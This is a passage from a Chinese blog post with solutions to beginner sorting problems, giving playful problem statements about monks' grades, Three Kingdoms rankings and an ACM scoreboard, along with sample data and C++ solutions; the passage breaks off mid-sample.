class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">99999<br></code></pre></td></tr></table></figure><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">排序会超时<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>hint都有了，必然桶排序</p><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> a[<span class="hljs-number">100010</span>];<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(a));<br>    <span class="hljs-type">int</span> n,k,tmp;<br>    ll ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;k);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;tmp);<br>        a[tmp]++;<br>    &#125;<br>    tmp=ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">100000</span>;i&gt;=<span class="hljs-number">1</span>;i--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=a[i];j&gt;<span class="hljs-number">0</span>;j--)<br>        &#123;<br>            ans+=i;<br>            k--;<br>            <span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="F-老和尚的导员"><a href="#F-老和尚的导员" class="headerlink" title="F.老和尚的导员"></a>F.老和尚的导员</h1><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">等小和尚回来后，老和尚居然没有睡觉。老和尚表示他的导员的excel表格坏掉了（老和尚居然有导员？好吧……据说是方丈），而且老和尚的导员要老和尚将寺中所有和尚的期末考试成绩按降序排列来发奖学金（和尚还有奖学金？）<br>不用多说，为了继续睡午觉，这个任务理所当然的落在了小和尚身上。所有……你继续帮忙吧。<br></code></pre></td></tr></table></figure><h3 id="Input-5"><a href="#Input-5" class="headerlink" title="Input"></a>Input</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">寺中主要考试科目有C语言，线性代数，高等数学和英语四个科目（怎么当和尚都这么累），输入的第一行是和尚的人数N（N&amp;lt;=100)，第二行至第N+1行分别为C语言a<span class="hljs-comment">[i]</span>，线性代数b<span class="hljs-comment">[i]</span>，高等数学c<span class="hljs-comment">[i]</span>和英语的成绩d<span class="hljs-comment">[i]</span>(0 &amp;lt;= a<span class="hljs-comment">[i]</span>,b<span class="hljs-comment">[i]</span>,c<span class="hljs-comment">[i]</span>,d<span class="hljs-comment">[i]</span> &amp;lt;= 100)。<br></code></pre></td></tr></table></figure><h3 id="Output-5"><a href="#Output-5" class="headerlink" title="Output"></a>Output</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">现需要你将和尚们的成绩以总成绩降序排列，输出数据的每行有两个数字，第一个数字为和尚的编号（输入时的第一个和尚成绩即为和尚<span class="hljs-number">1</span>，第二个为和尚<span class="hljs-number">2</span>），第二个数字为和尚的总成绩（如果总成绩相同，则按<span class="hljs-built_in">C</span>语言的成绩排列，如在相同，则按线性代数输出编号，以此类推。）<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-5"><a href="#Sample-Input-5" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">5</span><br><span class="hljs-symbol">98 </span><span class="hljs-number">50</span> <span class="hljs-number">27</span> <span class="hljs-number">65</span><br><span class="hljs-symbol">58 </span><span class="hljs-number">52</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span><br><span class="hljs-symbol">98 </span><span class="hljs-number">96</span> <span class="hljs-number">90</span> <span class="hljs-number">89</span><br><span class="hljs-symbol">31 </span><span class="hljs-number">65</span> <span class="hljs-number">98</span> <span class="hljs-number">78</span><br><span class="hljs-symbol">65 </span><span class="hljs-number">67</span> <span class="hljs-number">66</span> <span class="hljs-number">90</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-5"><a href="#Sample-Output-5" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">373</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">288</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">272</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">240</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">150</span><br></code></pre></td></tr></table></figure><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">score</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-type">int</span> xxds;<br>    <span class="hljs-type">int</span> gdsx;<br>    <span class="hljs-type">int</span> yy;<br>    <span class="hljs-type">int</span> sum;<br>&#125;p[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(score h1, score h2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(h1.sum!=h2.sum)<span class="hljs-keyword">return</span> h1.sum&gt;h2.sum;<br>    <span class="hljs-keyword">if</span>(h1.c != h2.c)<span class="hljs-keyword">return</span> h1.c &gt; h2.c;<br>    <span class="hljs-keyword">if</span>(h1.xxds!=h2.xxds)<span class="hljs-keyword">return</span> h1.xxds&gt;h2.xxds;<br>    <span class="hljs-keyword">if</span>(h1.gdsx!=h2.gdsx)<span class="hljs-keyword">return</span> h1.gdsx&gt;h2.gdsx;<br>    <span class="hljs-keyword">if</span>(h1.yy!=h2.yy)<span class="hljs-keyword">return</span> h1.yy&gt;h2.yy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            p[i].num=i+<span class="hljs-number">1</span>;<br>            cin &gt;&gt; p[i].c &gt;&gt; p[i].xxds &gt;&gt; p[i].gdsx &gt;&gt; p[i].yy;<br>            p[i].sum= p[i].c + p[i].xxds + p[i].gdsx + p[i].yy;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(p,p+n,cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cout&lt;&lt;p[i].num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;p[i].sum&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="G-健忘的老和尚"><a href="#G-健忘的老和尚" class="headerlink" title="G.健忘的老和尚"></a>G.健忘的老和尚</h1><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">当小和尚排完名单后，老和尚突然一拍脑袋：“导员把每个人的人名都给我了，可我忘记告诉你了。”好吧……我们可怜的小和尚看来要费二遍事了（好像之前的任务都是你帮他做的，好吧，你真可怜）<br></code></pre></td></tr></table></figure><h3 id="Input-6"><a href="#Input-6" class="headerlink" title="Input"></a>Input</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">输入数据为多组，输入的第一行为和尚的人数<span class="hljs-built_in">N</span>，可以得到奖学金的人数<span class="hljs-variable">M</span>，和需要补考的人数<span class="hljs-built_in">O</span>（在这里可以满足<span class="hljs-variable">M</span><span class="hljs-operator">+</span><span class="hljs-built_in">O</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">lt</span><span class="hljs-operator">;=</span><span class="hljs-built_in">N</span>，即得到奖学金的和尚一定不用参加补考）。之后的<span class="hljs-built_in">N</span>行每行都有一个字符串（即为和尚的名字，长度小于<span class="hljs-number">100</span>）和尚考试的总分<span class="hljs-variable">a</span><span class="hljs-punctuation">[</span><span class="hljs-variable">i</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">(</span><span class="hljs-number">0</span> <span class="hljs-operator">&amp;</span><span class="hljs-variable">lt</span><span class="hljs-operator">;=</span> <span class="hljs-variable">a</span><span class="hljs-punctuation">[</span><span class="hljs-variable">i</span><span class="hljs-punctuation">]</span> <span class="hljs-operator">&amp;</span><span class="hljs-variable">lt</span><span class="hljs-operator">;=</span> <span class="hljs-number">1000</span><span class="hljs-punctuation">)</span>。<br></code></pre></td></tr></table></figure><h3 id="Output-6"><a href="#Output-6" class="headerlink" title="Output"></a>Output</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">前<span class="hljs-variable">M</span>行，每行是获得奖学金的小和尚的名字；<br>后<span class="hljs-built_in">O</span>行，每行是补考的小和尚的名字；<br>由于老和尚觉得很对不起小和尚，所以他决定这次简单些，所以无论是奖励还是惩罚都按照总成绩从低到高输出和尚的名字即可。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-6"><a href="#Sample-Input-6" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">5</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">a</span> <span class="hljs-number">192</span> <br><span class="hljs-attribute">aa</span> <span class="hljs-number">212</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">351</span><br><span class="hljs-attribute">bab</span> <span class="hljs-number">128</span><br><span class="hljs-attribute">bbaa</span> <span class="hljs-number">654</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-6"><a href="#Sample-Output-6" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bbaa</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bab</span><br><span class="hljs-keyword"></span>a<br></code></pre></td></tr></table></figure><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">score</span><br>&#123;<br>    <span class="hljs-type">int</span> grade;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">110</span>];<br>&#125;p[<span class="hljs-number">10000</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(score h1, score h2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h1.grade&gt;h2.grade;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m,o;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;m&gt;&gt;o)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>        <span class="hljs-built_in">getchar</span>();<br>            cin&gt;&gt;p[i].name&gt;&gt;p[i].grade;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(p,p+n,cmp);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=m<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>        &#123;<br>            cout&lt;&lt;p[i].name&lt;&lt;endl;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n<span class="hljs-number">-1</span>;i&gt;=n-o;i--)<br>        &#123;<br>            cout&lt;&lt;p[i].name&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="H-戏说三国"><a href="#H-戏说三国" class="headerlink" title="H.戏说三国"></a>H.戏说三国</h1><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">   东汉末年，宦官当权，民不聊生。灵帝中平元年，张角兄弟发动黄巾起义，官军闻风丧胆。为抵抗黄巾，幽州太守刘焉出榜招兵。榜文前，刘备、关羽、张飞三兄弟萍水相逢。三人都有为国效力之心，于是桃园结为异姓兄弟，开始了一段三国浪漫传奇……<br>  如果我问你三国中谁最聪明你一定会说是诸葛亮，我要问你谁武功最高，保不准你就要说关羽。是啊，我们的刘备对于优秀的手下向来十分满意。可是有一天，刘备在无意间在朋友圈里看到了梁山的宋江正在进行英雄排座次，最可气的是这条动态已经被转发评论了无数次了……这一下可气坏了刘备，他决定也来一次，蜀中文武百官大排名。<br>为了公平起见，诸葛亮帮他制定一条评分标准：每个官员有一个智育、德育、武育三个分数，分别以b<span class="hljs-meta">%</span>，a<span class="hljs-meta">%</span>，c<span class="hljs-meta">%</span>的比率计入加权总分，按总分降序排列，总分相同按智育折合后的分数降序，智育相同按德育，依次类推最终决定排名。（保证没有排名一样的两个人）<br></code></pre></td></tr></table></figure><h3 id="Input-7"><a href="#Input-7" class="headerlink" title="Input"></a>Input</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">输入第一行t(1<span class="hljs-symbol">&amp;lt;</span>=t<span class="hljs-symbol">&amp;lt;</span>=1000)表示输入的组数。接下来每组第一行1个整数n（1<span class="hljs-symbol">&amp;lt;</span>=n<span class="hljs-symbol">&amp;lt;</span>=100000）三个实数a,b,c(a+b+c=100)接下来n行每行包括英雄的名字，字符串s（1<span class="hljs-symbol">&amp;lt;</span>=len<span class="hljs-symbol">&amp;lt;</span>=20,全为小写字母） 智育、德育、武育的分数（整数）。（1~100）<br></code></pre></td></tr></table></figure><h3 id="Output-7"><a href="#Output-7" class="headerlink" title="Output"></a>Output</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">每组第一行输出是第几组输出<span class="hljs-keyword">Case</span> <span class="hljs-meta">#t：接下来输出n行每行包括英雄的名字，总分，智育、德育、武育折合后的分数（保留四位小数）。</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Input-7"><a href="#Sample-Input-7" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span><br><span class="hljs-attribute">3</span> <span class="hljs-number">20</span>.<span class="hljs-number">00</span>  <span class="hljs-number">20</span>.<span class="hljs-number">00</span>  <span class="hljs-number">60</span>.<span class="hljs-number">00</span><br><span class="hljs-attribute">zhugeliang</span> <span class="hljs-number">90</span> <span class="hljs-number">80</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">zhangfei</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span><br><span class="hljs-attribute">guanyu</span> <span class="hljs-number">10</span> <span class="hljs-number">100</span> <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-7"><a href="#Sample-Output-7" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Case</span> #<span class="hljs-number">1</span>:<br><span class="hljs-attribute">guanyu</span> <span class="hljs-number">82</span>.<span class="hljs-number">0000</span> <span class="hljs-number">2</span>.<span class="hljs-number">0000</span> <span class="hljs-number">20</span>.<span class="hljs-number">0000</span> <span class="hljs-number">60</span>.<span class="hljs-number">0000</span><br><span class="hljs-attribute">zhangfei</span> <span class="hljs-number">60</span>.<span class="hljs-number">0000</span> <span class="hljs-number">0</span>.<span class="hljs-number">0000</span> <span class="hljs-number">0</span>.<span class="hljs-number">0000</span> <span class="hljs-number">60</span>.<span class="hljs-number">0000</span><br><span class="hljs-attribute">zhugeliang</span> <span class="hljs-number">34</span>.<span class="hljs-number">0000</span> <span class="hljs-number">18</span>.<span class="hljs-number">0000</span> <span class="hljs-number">16</span>.<span class="hljs-number">0000</span> <span class="hljs-number">0</span>.<span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">haohan</span><br>&#123;<br>    <span class="hljs-type">double</span> sum;<br>    <span class="hljs-type">double</span> zy;<br>    <span class="hljs-type">double</span> dy;<br>    <span class="hljs-type">double</span> wy;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">21</span>];<br>&#125;p[<span class="hljs-number">1010</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(haohan p1, haohan p2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> p1.sum&gt;p2.sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t,n;<br>    <span class="hljs-type">double</span> a,b,c;<br>    cin&gt;&gt;t;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;t;i++)<br>    &#123;<br>        cin&gt;&gt;n&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            cin&gt;&gt;p[j].name&gt;&gt;p[j].zy&gt;&gt;p[j].dy&gt;&gt;p[j].wy;<br>            p[j].zy*=b/<span class="hljs-number">100</span>;<br>            p[j].dy*=a/<span class="hljs-number">100</span>;<br>            p[j].wy*=c/<span class="hljs-number">100</span>;<br>            p[j].sum=p[j].zy+p[j].dy+p[j].wy;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(p,p+n,cmp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Case #%d:\n&quot;</span>,i+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %.4lf %.4lf %.4lf %.4lf\n&quot;</span>,p[j].name,p[j].sum,p[j].zy,p[j].dy,p[j].wy);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="I-相约摩洛哥"><a href="#I-相约摩洛哥" class="headerlink" title="I.相约摩洛哥"></a>I.相约摩洛哥</h1><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">2015</span>年<span class="hljs-number">5</span>月ACM全球总决赛在摩洛哥卡萨布兰卡举行，到时会有来自世界各地的acm大牛齐聚摩洛哥。<br>  <br>作为本次大赛的举办方负责人阿焜和阿祥被分配给了一个重要的任务，就是在比赛中统计大家的排名。<br>acm大赛排名规则（摘自百度百科）：<br>    最后的获胜者为正确解答题目最多且总用时最少的队伍。每道试题用时将从竞赛开始到试题解答被判定为正确为止，其间每一次提交运行结果被判错误的话将被加罚<span class="hljs-number">20</span>分钟时间，未正确解答的试题不记时。例如：<span class="hljs-keyword">A</span>、B两队都正确完成两道题目，其中<span class="hljs-keyword">A</span>队提交这两题的时间分别是比赛开始后<span class="hljs-number">1:00和2:45</span>，B队为<span class="hljs-number">1:20和2:00</span>，但B队有一题提交了<span class="hljs-number">2</span>次。这样<span class="hljs-keyword">A</span>队的总用时为<span class="hljs-number">1:00+2:45</span>=<span class="hljs-number">3</span>:<span class="hljs-number">45</span>而B队为<span class="hljs-number">1:20+2:00</span>+<span class="hljs-number">0:20=3:40</span>，所以B队以总用时少而获胜。<br>请你帮他俩完成这项任务吧！（保证没有成绩完全相同两支队伍）<br></code></pre></td></tr></table></figure><h3 id="Input-8"><a href="#Input-8" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">多组输入，每组一个正整数<span class="hljs-built_in">n</span>（<span class="hljs-number">1</span>&amp;lt;=<span class="hljs-built_in">n</span>&amp;lt;=<span class="hljs-number">100000</span>），代表有<span class="hljs-built_in">n</span>个队伍参赛。接下来的<span class="hljs-built_in">n</span>行，每行分别有一个字符串（只包含小写英文字母）作为队伍名，长度<span class="hljs-number">1</span>&amp;lt;=<span class="hljs-built_in">len</span>&amp;lt;=<span class="hljs-number">10</span>;ABC三道题的ac时间（以分钟为单位），时间为-<span class="hljs-number">1</span>表示该题没有ac。接下来又有<span class="hljs-built_in">n</span>行，表示每道题的提交次数,用<span class="hljs-number">3</span>个正整数表示。<br></code></pre></td></tr></table></figure><h3 id="Output-8"><a href="#Output-8" class="headerlink" title="Output"></a>Output</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">输出排行榜。<span class="hljs-built_in">n</span>行，每行一个队伍的名字、解题数和总用时。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-8"><a href="#Sample-Input-8" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">team</span> <span class="hljs-number">30</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span><br><span class="hljs-attribute">behappy</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">90</span><br><span class="hljs-attribute">newbee</span> <span class="hljs-number">15</span> <span class="hljs-number">16</span> <span class="hljs-number">17</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">1</span> <span class="hljs-number">10</span><br><span class="hljs-attribute">1</span> <span class="hljs-number">1</span> <span 